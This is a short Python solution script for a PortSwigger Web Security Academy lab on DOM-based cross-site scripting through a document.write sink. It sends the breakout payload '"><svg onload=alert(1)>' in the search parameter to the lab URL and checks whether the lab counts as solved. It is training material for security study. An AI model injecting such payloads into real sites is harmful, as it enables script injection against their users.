#https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink


#To solve this lab starting from description i input a search then inspect the page
#ctrl+F to search for what i inputted and foud the vulnerable img tag
from utils import *

url="https://0a15005f03a20d6b817c7f4600d10065.web-security-academy.net/"
payload='?search="><svg onload=alert(1)>'
url+=payload
response=requests.get(url)
print(check_succes(parse_html(response)))